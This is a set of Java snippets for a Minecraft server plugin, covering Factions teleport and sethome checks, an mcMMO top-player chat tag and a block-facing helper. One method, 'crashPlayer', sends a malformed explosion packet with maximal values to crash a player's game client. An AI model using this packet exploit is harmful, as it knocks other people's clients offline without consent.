// Proibir home em territ√≥rios inimigos
public static boolean isValidTeleport(Location l, Player p) {
		
		MPlayer mp = MPlayer.get(p);
        BoardColl coll = BoardColl.get();
        Faction faction = coll.getFactionAt(PS.valueOf(l));
		if (!faction.getMPlayers().contains(mp) && !(faction.getRelationTo(mp.getFaction()) == Rel.ALLY)) {
			if (faction.getId().equals(Factions.ID_NONE) || faction.getId().equals(Factions.ID_WARZONE) || faction.getId().equals(Factions.ID_SAFEZONE)) {
				return true;
			} else {
				p.sendMessage(Mensagens.Sem_Permissao_Teleportar.replace("%faction%", faction.getName()));
				return false;
			}
		}
		return true;
	}
	
	public static boolean isValidSetHome(Location l, Player p) {
		
		MPlayer mp = MPlayer.get(p);
        BoardColl coll = BoardColl.get();
        Faction faction = coll.getFactionAt(PS.valueOf(l));
		if (!faction.getMPlayers().contains(mp) && !(faction.getRelationTo(mp.getFaction()) == Rel.ALLY)) {
			if (faction.getId().equals(Factions.ID_NONE) || faction.getId().equals(Factions.ID_WARZONE) || faction.getId().equals(Factions.ID_SAFEZONE)) {
				return true;
			} else {
				p.sendMessage(Mensagens.Sem_Permissao_Sethome.replace("%faction%", faction.getName()));
				return false;
			}
		}
		return true;
	}
  
  //
  
  // MCTOP
  
  public static BukkitTask TTask;
	private static String playerTopOne;
	   
	@EventHandler(ignoreCancelled = true)
	public void aoEnviarMenssagem(ChatMessageEvent e) {
		if (playerTopOne != null && playerTopOne.equalsIgnoreCase(e.getSender().getName()) && e.getTags().contains("mctop")) {
			e.setTagValue("mctop", Settings.mcTopTag_Tag);
	  	  }
	}

	public static void checkMCTop() {
		TTask = (new BukkitRunnable() {
			public void run() {
				List<PlayerStat> tops = DatabaseManagerFactory.getDatabaseManager().readLeaderboard((SkillType)null, 1, 1);
				if (!tops.isEmpty()) {
					playerTopOne = ((PlayerStat)tops.get(0)).name;
				}
			}
		}).runTaskTimerAsynchronously((Plugin) Main.get(), 60L, (long)Settings.mcTopTag_Tempo_De_Checagem * 20L);
	}
  
  // 
  
  //
  
  // Crashar player
  
  private void crashPlayer(Player player) {
		try {
			Class<?> PacketPlayOutExplosionClass = ReflectionUtils.getNMSClass("PacketPlayOutExplosion");
			Class<?> Vector3dClass = ReflectionUtils.getNMSClass("Vec3D");
			Constructor<?> PacketPlayOutExplosionConstructor = PacketPlayOutExplosionClass.getConstructor(double.class, double.class, double.class, float.class, List.class, Vector3dClass);
		    Constructor<?> Vector3dConstructor = Vector3dClass.getConstructor(double.class, double.class, double.class);
		    Object Vec3D = Vector3dConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
		    Object packet = PacketPlayOutExplosionConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), Vec3D);
		    ReflectionUtils.sendPacket(player, packet);
		} catch (NoSuchMethodException | SecurityException | IllegalAccessException | IllegalArgumentException | InvocationTargetException | InstantiationException e) {
			e.printStackTrace();
		}
	}
  
  
  //
  
  //
 	  public Block getBlockInFront(LivingEntity ent) {
		  Location loc = ent.getLocation();
		  switch ((int)(loc.getYaw() * 4.0f / 360.0f + 0.5)) {
	            case 0: {
	                return loc.add(0.0, 0.0, 1.0).getBlock();
	            }
	            case 1: {
	                return loc.add(-1.0, 0.0, 0.0).getBlock();
	            }
	            case 2: {
	                return loc.add(0.0, 0.0, -1.0).getBlock();
	            }
	            case 3: {
	                return loc.add(1.0, 0.0, 0.0).getBlock();
	            }
	            default: {
	                return null;
	            }
	        }
	    }
